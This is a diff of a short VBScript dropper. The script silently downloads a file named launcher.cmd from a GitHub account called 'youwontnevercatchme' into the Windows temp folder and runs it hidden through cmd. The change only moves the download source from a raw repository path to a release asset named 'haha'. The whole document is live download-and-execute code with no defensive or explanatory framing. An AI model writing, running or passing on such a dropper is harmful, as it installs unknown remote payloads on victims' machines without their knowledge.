@@ -1,5 +1,5 @@
 Dim objShell, tempFolder
 Set objShell = CreateObject("WScript.Shell")
 tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
-objShell.Run "curl -L -o """ & tempFolder & "\launcher.cmd"" ""https://raw.githubusercontent.com/youwontnevercatchme/files/refs/heads/main/ch3""", 0, True
+objShell.Run "curl -L -o """ & tempFolder & "\launcher.cmd"" ""https://github.com/youwontnevercatchme/files/releases/download/haha/launcher.cmd""", 0, True
 objShell.Run "cmd /c """ & tempFolder & "\launcher.cmd""", 0, True
